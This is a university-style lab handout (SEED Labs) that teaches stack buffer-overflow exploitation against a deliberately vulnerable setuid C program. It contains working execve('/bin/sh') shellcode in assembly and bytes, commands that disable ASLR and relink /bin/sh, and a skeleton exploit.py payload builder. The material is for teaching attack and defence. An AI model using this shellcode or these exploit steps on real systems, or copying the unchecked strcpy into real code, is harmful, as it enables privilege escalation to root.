# SEED Labs -- Buffer Overflow Attack Lab

???note Copyright © 2006 - 2016 by Wenliang Du.
This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 
4.0 International License. If you remix, transform, or build upon the material, 
this copyright notice must be left intact, or reproduced in a way that is reasonable 
to the medium in which the work is being re-published.
```

## 1. Overview

Buffer overflow is defined as the condition in which a program attempts to
write data beyond the boundary of a buffer. This
vulnerability can be used by a malicious user to alter the flow control of
the program, leading to the execution of malicious code.
The objective of this lab is for students to gain practical
insights into this type of vulnerability, and learn how to
exploit the vulnerability in attacks.


In this lab, students will be given a program with a buffer-overflow
vulnerability; their task is to develop a scheme to exploit 
the vulnerability and finally gain the root privilege.  In addition to the
attacks, students will be guided to walk through several protection
schemes that have been implemented in the operating system to counter against 
buffer-overflow attacks.  Students need to evaluate 
whether the schemes work or not and explain why. This lab
covers the following topics:

- Buffer overflow vulnerability and attack
- Stack layout 
- Address randomization, non-executable stack, and StackGuard
- Shellcode (32-bit and 64-bit)

Files needed for this lab are included in [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Labsetup.zip). To download the lab files 
to your CloudLab machine, run the followings:

~~~bash
mkdir setuid_lab
cd setuid_lab
wget https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Labsetup.zip
unzip Labsetup.zip
cd Labsetup
~~~

## 2. Environment Setup


Modern operating systems have implemented several
security mechanisms to make the buffer-overflow attack difficult. 
To simplify our attacks, we need to disable them first. 
Later on, we will enable them and 
see whether our attack can still be successful or not.


???note Address Space Randomization

  - `ubuntu` and several other Linux-based systems uses address space
  randomization to randomize the starting address of heap and
  stack. This makes guessing the exact addresses difficult; guessing
  addresses is one of the critical steps of buffer-overflow attacks.  
  This feature can be disabled using the following command:

~~~bash
sudo sysctl -w kernel.randomize_va_space=0
~~~

```

???note Configuring /bin/sh

- In the recent versions of Ubuntu OS, the `/bin/sh` symbolic link 
points to the `/bin/dash` shell. The `dash` program, as well
as `bash`,  has implemented a security countermeasure
that prevents itself from being executed in a `setuid` process. 
Basically, if they detect that they are 
executed in a `setuid` process, they will immediately 
change the effective user ID to the process's real user ID, essentially
dropping the privilege. 
- Since our victim program is a `setuid` program, and our 
attack relies on running `/bin/sh`, the countermeasure
in `/bin/dash` makes our attack more difficult. Therefore,
we will link `/bin/sh` to another shell that does not 
have such a countermeasure (in later tasks, we will show that with
a little bit more effort, the countermeasure in `/bin/dash`
can be easily defeated). We have installed a shell program 
called `zsh` in our Ubuntu 20.04 VM. The following
command can be used to link `/bin/sh` to `zsh`:

~~~bash
sudo ln -sf /bin/zsh /bin/sh
~~~


???note StackGuard and Non-Executable Stack

These are two additional countermeasures implemented in the system. 
They can be turned off during the compilation.
We will discuss them later when we compile the vulnerable program.

```


## 3. Task 1: Getting Familiar with Shellcode

The ultimate goal of buffer-overflow attacks is to inject
malicious code into the target program, so the code can be 
executed using the target program's privilege.
Shellcode is widely used in most code-injection attacks. 
Let us get familiar with it in this task.


???note The C Version of Shellcode

A shellcode is basically a piece of code that launches a shell. 
If we use C code to implement it, it will look like the following:


~~~c
#include <stdio.h>

int main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
~~~
 
Unfortunately, we cannot just compile this code and use the binary code
as our shellcode (detailed explanation is provided in the SEED book). 
The best way to write a shellcode is to use assembly code. 
In this lab, we only provide the binary version of a shellcode,
without explaining how it works (it is non-trivial).


```

???note 32-bit Shellcode

~~~
; Store the command on stack
xor  eax, eax
push eax          
push "//sh"
push "/bin"
mov  ebx, esp     ; ebx --> "/bin//sh": execve()'s 1st argument

; Construct the argument array argv[]
push eax          ; argv[1] = 0
push ebx          ; argv[0] --> "/bin//sh"
mov  ecx, esp     ; ecx --> argv[]: execve()'s 2nd argument

; For environment variable 
xor  edx, edx     ; edx = 0: execve()'s 3rd argument

; Invoke execve()
xor  eax, eax     ; 
mov  al,  0x0b    ; execve()'s system call number
int  0x80
~~~


The shellcode above basically invokes the `execve()` system call 
to execute `/bin/sh`. In a separate SEED lab, the Shellcode lab, 
we guide students to write 
shellcode from scratch. Here we only give a very brief explanation. 

- The third instruction pushes `"//sh"`, rather than `"/sh"` into the 
stack. This is because we need a 32-bit number here, and `"/sh"` 
has only 24 bits. Fortunately, `"//"` is equivalent to `"/"`, so 
we can get away with a double slash symbol. 
- We need to pass three arguments to `execve()` via 
the `ebx`, `ecx` and `edx` registers,    
respectively. The majority of the shellcode basically constructs
the content for these three arguments. 
- The system call `execve()` is called when we set `al` to
`0x0b`, and execute `"int 0x80"`.


```


???note 64-Bit Shellcode

We provide a sample 64-bit shellcode in the following.
It is quite similar to the 32-bit shellcode, except that 
the names of the registers are different and the 
registers used by the `execve()` system call
are also different. Some explanation of the code is given in the 
comment section, and we will not provide detailed 
explanation on the shellcode. 


~~~
xor  rdx, rdx        ; rdx = 0: execve()'s 3rd argument
push rdx
mov  rax, '/bin//sh' ; the command we want to run
push rax             ; 
mov  rdi, rsp        ; rdi --> "/bin//sh": execve()'s 1st argument 
push rdx             ; argv[1] = 0
push rdi             ; argv[0] --> "/bin//sh"
mov  rsi, rsp        ; rsi --> argv[]: execve()'s 2nd argument
xor  rax, rax
mov  al,  0x3b       ; execve()'s system call number
syscall              
~~~

```

???note Task: Invoking the Shellcode


We have generated the binary code from the assembly code above, and
put the code in a C program called `call\_shellcode.c` inside
the `shellcode` folder. In this task, we will test the shellcode. 

~~~c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode); // Copy the shellcode to the stack
   int (*func)() = (int(*)())code;
   func();                 // Invoke the shellcode from the stack
   return 1;
} 
~~~
 
- The code above includes two copies of shellcode, one is 32-bit
and the other is 64-bit. When we compile the program using 
the `-m32` flag, the 32-bit version will be used; 
without this flag, the 64-bit version will be used. 
- Using the provided `Makefile`, you can compile
the code by typing `make`. 
- Two binaries will be created, `a32.out` (32-bit)
and `a64.out` (64-bit). 
- Run them and describe your observations. 
It should be noted that the compilation
uses the `execstack} option, which allows 
code to be executed from the stack; 
without this option, the program will fail.


```

## 4. Task 2: Understanding the Vulnerable Program

The vulnerable program used in this lab is called 
`stack.c`, which is in the `code` folder. 
This program has a buffer-overflow vulnerability,
and your job is to exploit this vulnerability and gain the root privilege. 
The code listed below has some non-essential information removed, 
so it is slightly different from what you get from the lab setup file.


~~~c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);          

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
~~~

The above program has a buffer overflow vulnerability. It first 
reads an input from a file called `badfile`, and then passes this
input to another buffer in the function `bof()`. The 
original input can have a maximum length of `517` bytes, but the buffer
in `bof()` is only `BUF_SIZE` bytes long, which is less than
`517`. 

Because `strcpy()` does not check boundaries, buffer overflow will occur.
Since this program is a root-owned `setuid` program, if a normal user can exploit
this buffer overflow vulnerability, the user might be 
able to get a root shell.It should be noted that 
the program gets its input from a file called `badfile`. This file
is under users' control. Now, our objective is to create the contents for 
`badfile`, such that when the vulnerable program
copies the contents into its buffer, a root shell can be spawned.


???note Task: Compilation


To compile the above vulnerable program, do not forget to 
turn off the StackGuard and the non-executable stack protections 
using the `-fno-stack-protector` and `-z execstack` options.
After the compilation, we need to make the program a
root-owned `setuid` program. We can achieve this by first 
change the ownership of the program to
`root`, and then change the permission to `4755` to enable the
`setuid` bit. It should be noted that changing ownership must be done before
turning on the `setuid` bit, because ownership change will cause the `setuid` bit to be turned
off.


~~~bash
gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
sudo chown root stack          
sudo chmod 4755 stack          
~~~

The compilation and setup commands are already included in `Makefile`, 
so we just need to type `make` to execute those commands. 
The variables `L1`, ..., `L4` are 
set in `Makefile`; they will be used during the compilation. 

```

## 5. Task 3: Launching Attack on 32-bit Program (Level 1)}


???note Investigation


To exploit the buffer-overflow vulnerability in the target program,
the most important thing to know is the distance between the 
buffer's starting position and the place where the return-address
is stored. We will use a debugging method to find it out.
Since we have the source code of the target program, we
can compile it with the debugging flag turned on. That will make it more
convenient to debug. 

We will add the `-g` flag to `gcc` command, so debugging information
is added to the binary. If you run `make`, the debugging version
is already created. We will use `gdb` to debug `stack-L1-dbg`.  
We need to create a file called
`badfile` before running the program. 


~~~bash
touch badfile       
gdb stack-L1-dbg
gdb-peda$ b bof      
gdb-peda$ run        
gdb-peda$ next  
gdb-peda$ p $ebp
gdb-peda$ p &buffer 
gdb-peda$ quit      
~~~

- When `gdb` stops inside the `bof()` function, it 
stops before the `ebp` register is set
to point to the current stack frame, so if we print out the value of 
`ebp` here, we will get the caller's `ebp` value. We need to use 
`next` to execute a few instructions and stop 
after the `ebp` register is modified to point to the stack
frame of the `bof()` function. 
- It should be noted that the frame pointer value
obtained from `gdb` is different from that during the actual
execution (without using `gdb`). This is because `gdb`  
has pushed some environment data into the stack before running the debugged program. 
When the program runs directly without using `gdb`,
the stack does not have those data, so the actual frame pointer value 
will be larger. You should keep this in mind when constructing 
your payload. 


???note Launching Attacks 


To exploit the buffer-overflow vulnerability in the target program,
we need to prepare a payload, and save it inside `badfile`. 
We will use a Python program to do that.
We provide a skeleton program called `exploit.py`, which
is included in the lab setup file.
The code is incomplete, and students need to replace some of the essential
values in the code (`need to change the content here`).


~~~python
#!/usr/bin/python3
import sys

shellcode= (
  ""                    # need to change the content here
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # need to change the content here
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00           # need to change the content here
offset = 0              # need to change the content here

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
~~~


After you finish the above program, run it. This will generate
the contents for `badfile`. Then run the vulnerable 
program `stack`. If your exploit is implemented correctly, you should 
be able to get a root shell:  


~~~bash
./exploit.py     
./stack-L1       
# 
~~~

In your lab report, in addition to providing screenshots to demonstrate
your investigation and attack, 
you also need to explain how the values used in your 
`exploit.py` are decided. These values are the most 
important part of the attack, so a detailed explanation can help
the instructor grade your report. Only demonstrating a successful
attack without explaining why the attack works will not 
receive many points. 

```


## 6. Task 4: Launching Attack without Knowing Buffer Size (Level 2)

In the Level-1 attack, using `gdb`, we get to know 
the size of the buffer. In the real world, this piece of information
may be hard to get. For example, if the target is a server program
running on a remote machine, we will not be able to get a copy
of the binary or source code. In this task, we are going to add a 
constraint: you can still use `gdb`, but you are not allowed
to derive the buffer size from your investigation. Actually, the 
buffer size is provided in `Makefile`, but you are not allowed
to use that information in your attack.

Your task is to get the vulnerable program to run your shellcode 
under this constraint. We assume that you do know the range of the 
buffer size, which is from 100 to 200 bytes. Another fact that 
may be useful to you is that, due to the memory alignment,
the value stored in the 
frame pointer is always multiple of four (for 32-bit programs). 

Please be noted, you are only allowed
to construct one payload that works for any buffer size
within this range.  You will not get all the credits if you
use the brute-force method, i.e., trying one buffer size
each time. The more you try, the easier it will be detected
and defeated by the victim. That's why minimizing the number
of trials is important for attacks.
In your lab report, you need to describe your method,
and provide evidences. 



## 7. Task 5: Launching Attack on 64-bit Program (Level 3)

In this task, we will compile the vulnerable program 
into a 64-bit binary called `stack-L3`.  
We will launch attacks on this program. The compilation and setup
commands are already included in `Makefile`. Similar to
the previous task, detailed explanation of your attack needs to be provided 
in the lab report. 


Using `gdb` to conduct an investigation on 64-bit programs 
is the same as that on 32-bit programs.
The only difference is the name of the register for the frame pointer.
In the x86 architecture,
the frame pointer is `ebp`, while in the x64 architecture,
it is `rbp`. 


Compared to buffer-overflow attacks on 32-bit
machines, attacks on 64-bit machines is more difficult. The most
difficult part is the address. Although the x64 architecture
supports 64-bit address space, only the address from
`0x00` through `0x00007FFFFFFFFFFF` is allowed. That means for
every address (8 bytes), the highest two bytes are always zeros.
This causes a problem.

In our buffer-overflow attacks, we need to store at least one address
in the payload, and the payload will be copied into the stack via
`strcpy()`. We know that the `strcpy()` function
will stop copying when it sees a zero. Therefore, if zero
appears in the middle of the payload, the content after the
zero cannot be copied into the stack. How to solve this
problem is the most difficult challenge in this attack.

## 8.  Submission

For each lab and assignment portions, you need to submit a detailed report, 
**in PDF format** , with screenshots, to describe that you have done and what 
you have observed. You also need to provide explanation to the observations 
that are interesting or surprising. Please also list 
the important code snippets followed by explanation. Simply attaching code without 
any explanation will not receive credits.

